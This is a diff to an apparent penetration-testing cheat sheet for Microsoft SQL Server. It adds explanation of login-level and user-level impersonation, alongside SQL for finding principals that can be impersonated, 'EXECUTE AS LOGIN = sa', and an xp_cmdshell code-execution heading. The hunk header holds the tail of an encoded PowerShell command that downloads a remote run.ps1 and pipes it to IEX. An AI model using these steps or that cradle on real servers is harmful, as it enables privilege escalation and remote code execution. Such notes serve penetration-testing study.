@@ -85,7 +85,11 @@ ADEAMQA4AC4AOQA6ADgAMQAvAHIAdQBuAC4AcABzADEAJwApACAAfAAgAEkARQBYAA=='
 
 **PRIVILEGE ESCALATION:**
 
-To view the users you can impersonate:
+Impersonation can be performed in two ways, first it can be done at a login level using the "EXECUTE AS LOGIN" statement, or it can be done at a user level with the "EXECUTE AS USER" statement.
+
+*Impersonation at a login level:*
+
+Enumerating users that can be impersonated at a login level. It is important to note that this query won't return us the user that is allowed to impersonate.
 
 ```
 SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
@@ -95,6 +99,9 @@ To impersonate(assuming you can impersonate the sa user):
 ```
 EXECUTE AS LOGIN = sa;
 ```
+
+*Impersonation at a user level:*
+
 
 **CODE EXECUTION(through xp_cmdshell):**
 
